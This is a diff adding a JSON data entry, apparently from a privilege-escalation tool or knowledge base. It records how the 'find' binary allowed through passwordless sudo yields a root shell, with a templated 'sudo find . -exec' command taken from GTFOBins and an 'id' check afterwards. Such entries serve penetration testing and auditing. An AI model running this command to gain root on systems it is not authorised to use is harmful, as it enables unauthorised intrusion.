@@ -1,0 +1,19 @@
+{
+  "id": "sudo_find",
+  "category": "SUDO_NOPASSWD_CUSTOM",
+  "binary": "find",
+  "cve": null,
+  "exploitation": [
+    "sudo {{binary}} . -exec {{shell}} \\; -quit"
+  ],
+  "post_exploit": [
+    "id"
+  ],
+  "source": "gtfobins.github.io",
+  "tags": [
+    "sudo",
+    "nopasswd",
+    "gtfobins"
+  ],
+  "severity": "high"
+}
